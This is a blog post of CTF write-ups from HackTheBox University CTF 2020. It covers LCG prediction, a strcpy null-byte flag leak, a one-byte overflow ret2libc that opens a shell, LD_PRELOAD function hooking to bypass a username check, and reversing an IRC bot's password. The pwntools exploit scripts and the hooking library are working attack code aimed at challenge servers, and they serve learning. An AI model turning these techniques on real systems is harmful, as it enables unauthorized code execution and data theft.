+++
title = "HTB Uni CTF 2020"
date = 2020-12-10

[taxonomies]
tags = ["ctf-writeups"]
+++


A couple weeks back I competed in HackTheBox's university CTF with a few other students from the Texas A&M Cybersecurity Club.  We placed in 37th place out of a few hundred.  

<!-- more -->


# buggy time machine

```text
I am the Doctor and I am in huge trouble. Rumors have it, you are the best time machine engineer in the galaxy. I recently bought a new randomiser for Tardis on Yquantine, but it must be counterfeit. Now every time I want to time travel, I will end up in a random year. Could you help me fix this? I need to find Amy and Rory! Daleks are after us. Did I say I am the Doctor?
```

## initial review

```python
import os
from datetime import datetime
from flask import Flask, render_template
from flask import request
import random
from math import gcd
import json
from secret import flag, hops, msg

class TimeMachineCore:
	
	n = ...
	m = ...
	c = ...
		

	def __init__(self, seed):
		self.year = seed 

	def next(self):
		self.year = (self.year * self.m + self.c) % self.n
		return self.year

app = Flask(__name__)
a = datetime.now()
seed = int(a.strftime('%Y%m%d')) <<1337 % random.getrandbits(128)
gen = TimeMachineCore(seed)


@app.route('/next_year')
def next_year():
	return json.dumps({'year':str(gen.next())})

@app.route('/predict_year', methods = ['POST'])
def predict_year():
	
	prediction = request.json['year']
	try:

		if prediction ==gen.next():
			return json.dumps({'msg': msg})
		else:
			return json.dumps({'fail': 'wrong year'})

	except:

		return json.dumps({'error': 'year not found in keys.'})

@app.route('/travelTo2020', methods = ['POST'])
def travelTo2020():
	seed = request.json['seed']
	gen = TimeMachineCore(seed)
	for i in range(hops): state = gen.next()
	if state == 2020:
		return json.dumps({'flag': flag})

@app.route('/')
def home():
	return render_template('index.html')
if __name__ == '__main__':
	app.run(debug=True)
```

The first thing I noticed is that TimeMachineCore is a [linear congruential generator](https://en.wikipedia.org/wiki/Linear_congruential_generator).  LCGs are not cryptographically secure so it is highly likely that we will be attacking the randomness.  

We have three routes that we can interact with the time machine with:

* `/next_year` which generates a random number using a TimeMachineCore that was seeded with random bits at the beginning of the program
*  `/predict_year` which will give us the secret variable `msg` if we can predict the number it generates
* `travelTo2020` which will give us the flag if we can provided it a seed which generates `2020` after `hops` random numbers

## cracking LCG parameters

So the first thing to do here is cracking the LCG parameters.  We have the ability to generate and receive an arbitrary number LCG states so it is pretty trivial to reverse engineer what the parameters which generated it are.  I'm not going to go into the math behind how it works, but [Cracking RNGs: Linear Congruential Generators](https://tailcall.net/blog/cracking-randomness-lcgs/) is the article I used if you would like to read about it.  


```python
from functools import reduce
from math import gcd

def egcd(a, b):
    lastremainder, remainder = abs(a), abs(b)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if a < 0 else 1), lasty * (-1 if b < 0 else 1)


def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise ValueError('modinv for {} does not exist'.format(a))
    return x % m

def crack_unknown_increment(states, modulus, multiplier):
    increment = (states[1] - states[0]*multiplier) % modulus
    return modulus, multiplier, increment

def crack_unknown_multiplier(states, modulus):
    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus
    return crack_unknown_increment(states, modulus, multiplier)


def crack_unknown_modulus(states):
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)


values = [
	584293201,
	1514369420,
	1930412587,
	1483060100,
	279230708,
	1138137296,
	2098757662,
	1590055177,
	340421540,
	2090774143,
	617182341
]

print(crack_unknown_modulus(values))
```

```text
❯ python crack_lcg_parameters.py
(2147483647, 48271, 0)
```

## predicting the next year

We know the parameters and the last state so we can just solve for the next year trivially like so: `(617182341 * 48271) mod 2147483647`


```text
❯ curl -X POST http://docker.hackthebox.eu:30263/predict_year --header "Content-Type: application/json"  --data '{"year": 465839415}'
{"msg": "*Tardis trembles*\nDoctor this is Amy! I am with Rory in year 2020. You need to rescue us within exactly 876578 hops. Tardis bug has damaged time and space.\nRemeber, 876578 hops or the universes will collapse!"}
```

## determining what seed gets us to 2020

Fun fact: an LCG is reversible!  I'm not gonna bother with the math but it's a fairly simple function to get the previous state and you can see it in my solution script below.  See [this stackoverflow post](https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator) if you're interested in the math.  

```text
❯ curl -X POST http://docker.hackthebox.eu:30263/travelTo2020 --header "Content-Type: application/json"  --data '{"seed": 2113508741}'
{"flag": "HTB{l1n34r_c0n9ru3nc35_4nd_prn91Zz}"}
```

```python
from functools import reduce
from math import gcd

def egcd(a, b):
    lastremainder, remainder = abs(a), abs(b)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if a < 0 else 1), lasty * (-1 if b < 0 else 1)


def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise ValueError('modinv for {} does not exist'.format(a))
    return x % m

def crack_unknown_increment(states, modulus, multiplier):
    increment = (states[1] - states[0]*multiplier) % modulus
    return modulus, multiplier, increment

def crack_unknown_multiplier(states, modulus):
    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus
    return crack_unknown_increment(states, modulus, multiplier)


def crack_unknown_modulus(states):
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)


values = [
    585065537,
    141094830,
    1117894293,
    2053819234,
    1325680659,
    1213377283,
]

n, m, c = crack_unknown_modulus(values)
print("n = %s, m = %s, c = %s" % (n, m, c))

def get_next(num):
	return (num * m) % n

def get_prev(num):
	return modinv(m,n) * num % n

values.append(get_next(values[-1]))
print("predicted year = %s" % values[-1])

hops = 876578

print("seed = %s" % reduce(lambda acc, x: get_prev(acc), [x for x in range(hops)], 2020))
```

flag: HTB{l1n34r_c0n9ru3nc35_4nd_prn91Zz}

# rigged_lottery


```text
Is everything in life completely random? Are we unable to change our fate? Or maybe we can change the future and even manipulate randomness?! Is luck even a thing? Try your "luck"!
```

## initial review


### main

```c
void main(void)

{
  setup();
  welcome();
  generate();
  do {
    menu();
  } while( true );
}
```
I will omit setup & welcome because they don't have anything interesting -- just writing a welcome message and setting io buffer settings.  Otherwise, nothing interesting to note here except that generate gets called once before we get to do anything. 

### generate

```c
void generate(void)

{
  long in_FS_OFFSET;
  int local_44;
  int local_40;
  int local_3c;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_44 = 1;
  local_40 = 0;
  if (_flag == 0) {
    printf("\nLength of number (1-32): ");
    __isoc99_scanf(&DAT_00102073,&local_44);
    if ((local_44 < 0x22) && (-1 < local_44)) {
      memset(local_38,0,(long)local_44);
      local_3c = open("/dev/urandom",0);
      if (local_3c < 0) {
        fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
        exit(0x69);
      }
      read(local_3c,local_38,(long)local_44);
      while (local_40 < local_44) {
        while (local_38[local_40] == '\0') {
          read(local_3c,local_38 + local_40,1);
        }
        local_40 = local_40 + 1;
      }
      strcpy(lucky_number,local_38);
      close(local_3c);
      puts("\nLucky number generated successfuly! Try your luck!");
    }
    else {
      puts("\nInvalid size!");
    }
  }
  else {
    _flag = 0;
    local_3c = open("/dev/urandom",0);
    if (local_3c < 0) {
      fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0x22);
    }
    read(local_3c,lucky_number,0x21);
    close(local_3c);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
The generate function has two main branches: the else branch runs the first time this function is called and populates `lucky_number` with random numbers.  The `if _flag == 0` branch runs any time after the first because `_flag` is set to 0 in the else branch.  It will ask for a number between 0 and 32, read that many bytes from /dev/urandom, and then use `strcpy` to move those bytes to `lucky_number`.  It should be noted that `strcpy` is meant to copy strings not raw bytes and has a couple peculiarites.  Namely that it also copies the terminating null byte from the source (because C strings are always null terminated).  The implication here is that if we generate a number of bytes smaller than the max size of `lucky_number` it will leave a null byte in `lucky_number`

### menu

```c
void menu(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf((char *)(double)cosy_coins,
                  
         "\nCurrent cosy coins: %.2f\n\n1. Generate lucky number.\n2. Play game.\n3. Claimprize.\n4. Exit.\n"
        );
  __isoc99_scanf(&DAT_00102073,&local_14);
  if (local_14 == 4) {
    puts("Goodbye!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x45);
  }
  if (local_14 < 5) {
    if (local_14 == 3) {
      claim();
      goto code_r0x0010174a;
    }
    if (local_14 < 4) {
      if (local_14 == 1) {
        generate();
        goto code_r0x0010174a;
      }
      if (local_14 == 2) {
        play();
        goto code_r0x0010174a;
      }
    }
  }
  puts("Invalid option!\n");
  menu();
code_r0x0010174a:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Nothing super interesting here: we can either regenerate lucky numbers, play the game, or claim a prize.  

### play

```c
void play(void)

{
  int iVar1;
  long in_FS_OFFSET;
  float local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nHow many coins do you want to bet?");
  __isoc99_scanf(&DAT_001020e4,&local_18);
  cosy_coins = cosy_coins - local_18;
  iVar1 = coin_check((ulong)(uint)cosy_coins);
  if (iVar1 != 0) {
    local_14 = open("/dev/urandom",0);
    if (local_14 < 0) {
      fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0x22);
    }
    read(local_14,rigged_number,0x31);
    close(local_14);
    iVar1 = strcmp(lucky_number,rigged_number);
    if (iVar1 == 0) {
      puts("\nYou won! Claim your reward!");
      prize_flag = 1;
    }
    else {
      puts("\nYou lost! Try again!");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We win if our lucky number is the same as the random numbers it generates.  It's using /dev/urandom so that doesn't seem very easy to attack.  The only thing I can think of would be getting a null byte into the first byte of `lucky_number` and then trying repeatedly until `/dev/urandom` gives us a null byte in the first byte of `rigged_number`.  It also doesn't do any bounds checking on the number of coins we bet which means we can bet a negative number of coins and get an arbitrary number of coins that way.  

### claim

```c
void claim(void)

{
  int __fd;
  long in_FS_OFFSET;
  int local_40;
  byte local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((prize_flag == 0) && (cosy_coins <= 100.00000000)) {
    puts("\nNo prizes available!");
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("\nEnjoy your prize!!\n");
  cosy_coins = cosy_coins + 269.00000000;
  local_40 = 0;
  __fd = open("./flag.txt",0);
  if (__fd < 0) {
    fwrite("\nError opening flag, exiting..\n",1,0x1f,stderr);
                    /* WARNING: Subroutine does not return */
    exit(0x6969);
  }
  read(__fd,local_38,0x21);
  while (local_40 < 0x21) {
    local_38[local_40] = local_38[local_40] ^ lucky_number[local_40];
    local_40 = local_40 + 1;
  }
  close(__fd);
  printf("%s",local_38);
                    /* WARNING: Subroutine does not return */
  exit(0xa9);
}
```

So, we get the flag if `prize_flag` is true or if we have more than 100 coins.  It's pretty trivial to get more than 100 coins which makes it quite unfortunate that what we actually get is the flag bitwise XORed with our lucky number.  

## putting it all together

So, we can print out the flag XORed with our lucky number but where do we go from there?  It's populated with random bytes at startup and attacking `/dev/urandom` would be tough at best.  If you'll recall, the generate function uses `strcpy` to copy the randomly generated bytes into `lucky_number` which will always copy a null terminator also.  This means that if generate n random bytes then there will be a null byte in `lucky_number[n]` which means we can leak a single byte of the flag.  We can then just do this multiple times to leak every character and then attach them together.  

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("rigged_lottery")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("docker.hackthebox.eu", 30269)


def main():

    buf = ""
    for i in range(len(buf),32):
        r = conn()
        r.recvuntil("4. Exit.\n")
        r.sendline("2")
        r.sendline("-300")
        r.recvuntil("4. Exit.\n")
        r.sendline("1")
        r.sendline(str(i))
        r.recvuntil("4. Exit.\n")
        r.sendline("3")
        r.recvuntil("prize!!\n\n")
        res = r.recvall()
        buf += chr(res[i])
        print(buf)

if __name__ == "__main__":
    main()
```


```text
❯ python rigged_lottery.py SILENT=1
HTB{strcpy_0nly_c4us3s_tr0ubl3!}
```

# mirror

```text
You found an ol' dirty mirror inside an abandoned house. This magic mirror reflects your most hidden desires! Use it to reveal the things you want the most in life! Don't say too much though..
```

## initial review

```text
❯ checksec mirror
[*] '/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```text
❯ ./mirror
✨ This old mirror seems to contain some hidden power..✨
There is a writing at the bottom of it..
"The mirror will reveal whatever you desire the most.. Just talk to it.."
Do you want to talk to the mirror? (y/n)
> y
Your answer was: y
"This is a gift from the craftsman.. [0x7ffeb133f5b0] [0x7f9a77796b10]"
Now you can talk to the mirror.
> hi
```

No canary and we get a couple addresses to help bypass PIE.  Let's take a look at what those addresses are and see if we can find where our stack overflow is.  

### main

```c
undefined8 main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setup();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  puts(
      "✨ This old mirror seems to contain some hidden power..✨\nThere is a writing at the bottom ofit.."
      );
  puts("\"The mirror will reveal whatever you desire the most.. Just talk to it..\"");
  printf("Do you want to talk to the mirror? (y/n)\n> ");
  read(0,&local_28,0x1f);
  if (((char)local_28 != 'y') && ((char)local_28 != 'Y')) {
    puts("You left the abandoned house safe!");
                    /* WARNING: Subroutine does not return */
    exit(0x45);
  }
  printf("Your answer was: ");
  printf((char *)&local_28);
  reveal();
  return 0;
}
```


### reveal

```c
void reveal(void)

{
  undefined local_28 [32];
  
  printf("\"This is a gift from the craftsman.. [%p] [%p]\"\n",local_28,printf);
  printf("Now you can talk to the mirror.\n> ");
                    /* Overruns using local_28(+0,1,40) */
  read(0,local_28,0x21);
  return;
}
```

So, we have a one byte overrun from local_28 which means we can control the lower byte of the stored stack base pointer.  The addresses it gives us are a variable on the stack and the location of printf.  


## leaking libc

```text
❯ nc docker.hackthebox.eu 30272
✨ This old mirror seems to contain some hidden power..✨
There is a writing at the bottom of it..
"The mirror will reveal whatever you desire the most.. Just talk to it.."
Do you want to talk to the mirror? (y/n)
> y
Your answer was: y
"This is a gift from the craftsman.. [0x7ffda86edb00] [0x7f572b026f70]"
Now you can talk to the mirror.
> ^C
```

I will be using the lovely [libc-database](https://github.com/niklasb/libc-database) to figure out the libc version from the printf address it prints.  ASLR means the upper bits are useless but the lower 12 are fixed and so can be used to determine the libc version.  

```text
❯ ./find printf f70
ubuntu-old-glibc (libc6_2.24-9ubuntu2.2_i386)
ubuntu-old-glibc (libc6_2.24-9ubuntu2_i386)
ubuntu-glibc (libc6_2.27-3ubuntu1.3_amd64)
debian-glibc (libc6_2.31-4_i386)
```

We have four candidates, only one of which is amd64 so it's pretty easy to pick from them.  The server is likely running libc 2.27.  

## putting it all together

We only have a single byte overrun so we can't overwrite the return pointer directly but as it turns out we don't need to because the main function returns after `reveal` finishes.  The "true" stored stack base pointer and the address of the buffer we're writing to only differ by a single byte so we can overwrite that byte and when `reveal` returns it will adjust the stack frame such that when main returns it looks to the beginning of our buffer for the return pointer.  We also know the libc version and the address of a symbol within libc so we can perform a [ret2libc](https://en.wikipedia.org/wiki/Return-to-libc_attack) attack and call `system("/bin/sh")`

```python
#!/usr/bin/env python3

from pwn import *
import re
exe = ELF("mirror")

context.binary = exe
context.terminal = ["termite","-e"]

def conn():
    if args.LOCAL:
        libc = ELF("/home/sky/libc-database/db/libc-2.32-5-x86_64.so")
        return (libc, process([exe.path]))
    else:
        libc = ELF("/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so")
        return (libc, remote("docker.hackthebox.eu", 30272))


def send_padded(r, msg, l):
    assert len(msg) <= l
    r.send(msg + b"A" * (l - len(msg)))

def main():
    libc, r = conn()

    libc_rop = ROP(libc)
    POP_RDI = (libc_rop.find_gadget(['pop rdi', 'ret']))[0]

    send_padded(r,b"y",0x1f)

    r.recvuntil("This is a gift from the craftsman..")
    addresses = r.recvline().decode()

    capture = re.search("\[(.*)\] \[(.*)\]", addresses)
    stack_addr = int(capture.group(1),16)
    printf_addr = int(capture.group(2),16)
    stack_exec_addr = stack_addr - 8 # gotta move this back 8 bytes so that the stored return pointer is at the front of our buffer
    libc_base = printf_addr - libc.symbols["printf"]

    libc.address = libc_base
    buf = p64(libc_base + POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols['system']) + b"B" * 8 + bytes([(stack_exec_addr) & 0xff])
    r.send(buf)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
❯ python mirror.py
[*] '/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to docker.hackthebox.eu on port 30272: Done
[*] Loading gadgets for '/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so'
[*] Switching to interactive mode
Now you can talk to the mirror.
> $ cat flag.txt
HTB{0n3_byt3_cl0s3r_2_v1ct0ry}
$  
```

# Hi! My name is (what?)

```text
I've been once told that my name is difficult to pronounce and since then I'm using it as a password for everything.
```

## initial review
```c
void main(void)

{
  EVP_PKEY_CTX *ctx;
  __uid_t __uid;
  passwd *ppVar1;
  long lVar2;
  int iVar3;
  size_t sVar4;
  size_t *outlen;
  uchar *in;
  size_t in_stack_ffffffd0;
  int local_28;
  
  puts("Who are you?");
  __uid = geteuid();
  ppVar1 = getpwuid(__uid);
  in = (uchar *)0x0;
  lVar2 = ptrace(PTRACE_TRACEME,0,0);
  if (lVar2 != 0) {
    puts("This doesn\'t seem right");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (ppVar1 != (passwd *)0x0) {
    ctx = (EVP_PKEY_CTX *)ppVar1->pw_name;
    iVar3 = strcmp((char *)ctx,username);
    if (iVar3 == 0) {
      local_28 = 0;
      while (local_28 < 0x198) {
        if ((*(uint *)(main + local_28) & 0xff) == breakpointvalue) {
          puts("What\'s this now?");
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
        local_28 = local_28 + 1;
      }
      sVar4 = strlen(encrypted_flag);
      outlen = (size_t *)malloc((sVar4 + 1) * 4);
      decrypt(ctx,encrypted_flag,outlen,in,in_stack_ffffffd0);
      *(undefined *)((int)outlen + sVar4) = 0;
      puts((char *)outlen);
    }
    else {
      puts("No you are not the right person");
    }
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("?");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

So, we see a couple anti-debugging features (ptrace, etc) but those aren't super relevant.  If the current executing username matches `~#L-:4;f` then it will decrypt a stored flag and print it.  The decryption involves the username so we can't just binary patch the username check away.  This is problematic because this is not a valid linux username.  So, what can we do?  

## i can so ptrace (alternative title: how you can just overwrite any dynamic library function)

Fun fact: on a Linux system the dynamic linker will check the environmental variable LD_PRELOAD for libraries and then bind those symbols before any other libraries.  What happens if two libraries provide the same symbol?  Well, the one which loads first!  LD_PRELOAD goes before any linked libraries which means that if you preload a shared library which exports a symbol it will override the symbol from the later loading library.  What this means is that we can just overwrite getpwuid so that it returns a struct with an arbitrary username!  

```c
#include <sys/types.h>
#include <stdlib.h>
#include <pwd.h>


long ptrace(int request, pid_t pid,
                   void *addr, void *data) {
	return 0;
}

struct passwd *getpwuid(uid_t uid) {
	struct passwd* ret = malloc(sizeof(struct passwd));
	ret->pw_name = "~#L-:4;f";
	ret->pw_passwd = "a";
	ret->pw_uid = 0;
	ret->pw_gid = 0;
	return ret;
}
```


```text
❯ gcc -m32 preload.c -shared -o preload.so
❯ LD_PRELOAD=$(pwd)/preload.so ./my_name_is
Who are you?
HTB{L00k1ng_f0r_4_w31rd_n4m3}
```

# ircware

```text
During a routine check on our servers we found this suspicious binary, but when analyzing it we couldn't get it to do anything. We assume it's dead malware but maybe something interesting can still be extracted from it?
```

## initial review

### entry

```c
undefined  [16] entry(void)

{
  int iVar1;
  
                    /* rax = 0x13e, getrandom */
  syscall();
  s_NICK_ircware_0000_00601018._13_4_ = s_NICK_ircware_0000_00601018._13_4_ & 0x7070707;
  s_NICK_ircware_0000_00601018._13_4_ = s_NICK_ircware_0000_00601018._13_4_ | 0x30303030;
  iVar1 = connect_localhost_8000(0x601025,4,0);
  if (-1 < iVar1) {
    write_empty_line?();
    write_empty_line?();
    write_empty_line?();
    do {
      read?();
      command_handler();
    } while( true );
  }
  syscall();
  syscall();
  return CONCAT88(DAT_00601068,0x3c);
}
```

Not a lot in the entry function.  It connects to a local server on port 8000 and then does some read/write on that socket but doesn't seem to actually write much.  

### command_handler


```c
void command_handler(void)

{
	  ...
      lVar5 = DAT_00601179;
      pcVar9 = pcVar13;
      pcVar11 = s_PRIVMSG_#secret_:@pass_00601161;
	  ...
      pcVar9 = pcVar13;
      pcVar11 = s_PRIVMSG_#secret_:@flag_00601128;
      do {
        pcVar12 = pcVar11;
        if (lVar5 == 0) break;
        lVar5 = lVar5 + -1;
        pcVar12 = pcVar11 + 1;
        cVar1 = *pcVar9;
        cVar2 = *pcVar11;
        pcVar9 = pcVar9 + 1;
        pcVar11 = pcVar12;
      } while (cVar1 == cVar2);
      if (lVar5 == 0) {
        if (_DAT_00601008 == 0) {
          FUN_00400485(pcVar12,s_Requires_password_006010c2,&DAT_006021a9,DAT_006010d4);
          return;

}
```

I've stripped large parts of this function out because they weren't super useful decompilation and this contains the relevant bits.  The important things to notice here are that:

1. This is IRC -- the PRIMSG #secret is a dead giveaway.  I just guessed at this point that it wanted an IRC server so I ran one and joined the #secret channel.  
2. the is a @flag command but it requires a password
3. there is a @pass function

The implication here is that this is an IRC bot and we need to give it the correct password before it will give us the flag.  

## so what's the password?

```text
                             LAB_00400401                                    XREF[1]:     0040043c(j)  
        00400401 8a 06           MOV        AL,byte ptr [RSI]=>DAT_006021c0                  = ??
        00400403 88 03           MOV        byte ptr [RBX]=>DAT_00601147,AL                  = "JJ3DSCP"
                                                                                             = 52h
        00400405 3c 00           CMP        AL,0x0
        00400407 74 35           JZ         LAB_0040043e
        00400409 3c 0a           CMP        AL,0xa
        0040040b 74 31           JZ         LAB_0040043e
        0040040d 3c 0d           CMP        AL,0xd
        0040040f 74 2d           JZ         LAB_0040043e
        00400411 48 3b 15        CMP        RDX,qword ptr [DAT_00601159]                     = 08h
                 41 0d 20 00
        00400418 77 4c           JA         LAB_00400466
        0040041a 3c 41           CMP        AL,0x41
        0040041c 72 0e           JC         LAB_0040042c
        0040041e 3c 5a           CMP        AL,0x5a
        00400420 77 0a           JA         LAB_0040042c
        00400422 04 11           ADD        AL,0x11
        00400424 3c 5a           CMP        AL,0x5a
        00400426 76 04           JBE        LAB_0040042c
        00400428 2c 5a           SUB        AL,0x5a
        0040042a 04 40           ADD        AL,0x40
                             LAB_0040042c                                    XREF[3]:     0040041c(j), 00400420(j), 
                                                                                          00400426(j)  
        0040042c 38 07           CMP        byte ptr [RDI]=>s_RJJ3DSCP_00601150,AL           = "RJJ3DSCP"
        0040042e 75 36           JNZ        LAB_00400466
        00400430 48 ff c2        INC        RDX
        00400433 48 ff c3        INC        RBX
        00400436 48 ff c6        INC        RSI
        00400439 48 ff c7        INC        RDI
        0040043c eb c3           JMP        LAB_00400401
                             LAB_0040043e                                    XREF[3]:     00400407(j), 0040040b(j), 
                                                                                          0040040f(j)  
        0040043e 48 89 ce        MOV        RSI,RCX
        00400441 48 3b 15        CMP        RDX,qword ptr [DAT_00601159]                     = 08h
                 11 0d 20 00
        00400448 75 1c           JNZ        LAB_00400466
        0040044a 48 ff 05        INC        qword ptr [DAT_00601008]
                 b7 0b 20 00
        00400451 48 8d 35        LEA        RSI,[s_Accepted_00601092]                        = "Accepted"
                 3a 0c 20 00
        00400458 48 8b 0d        MOV        RCX,qword ptr [DAT_0060109b]                     = 0000000000000009h
                 3c 0c 20 00
        0040045f e8 21 00        CALL       FUN_00400485                                     undefined FUN_00400485()
                 00 00
        00400464 eb 1e           JMP        LAB_00400484
                             LAB_00400466                                    XREF[3]:     00400418(j), 0040042e(j), 
                                                                                          00400448(j)  
        00400466 48 c7 05        MOV        qword ptr [DAT_00601008],0x0
                 97 0b 20 
                 00 00 00 
        00400471 48 8d 35        LEA        RSI,[s_Rejected_006010a3]                        = "Rejected"
                 2b 0c 20 00
        00400478 48 8b 0d        MOV        RCX,qword ptr [DAT_006010ac]                     = 0000000000000009h
                 2d 0c 20 00
        0040047f e8 01 00        CALL       FUN_00400485                                     undefined FUN_00400485()
                 00 00
```

So the core flow of this segment of assembly is a fancy string comparison.  It loads the byte it is currently operating on (so 0th, 1st, 2nd, until it goes through 8 of them), mutates it based on a condition, and then compares it against `RJJ3DSCP`.  I will put these mutations in the form of a python script because that's how I solved it and I don't want to explain it with english lol.  

```python
from string import printable

def mutate(c):
	if c < 0x41:
		return c
	if c > 0x5a:
		return c
	c += 0x11
	if c <= 0x5a:
		return c
	c -= 0x5a
	c += 0x40
	return c

comp = "RJJ3DSCP"

for i in range(8):
	for j in printable:
		if chr(mutate(ord(j))) == comp[i]:
			print(j,end='')
```
That script solves for ASS3MBLY which definitely looks meaningful.  Let's try telling it to the bot!  

```text
* Now talking on #secret
* #secret :No topic is set
* ircware_7040 (ircware@127.0.0.1) has joined
<sky> @pass ASS3MBLY
<ircware_7040> Accepted
<sky> @flag
<ircware_7040> HTB{m1N1m411st1C_fL4g_pR0v1d3r_b0T}
```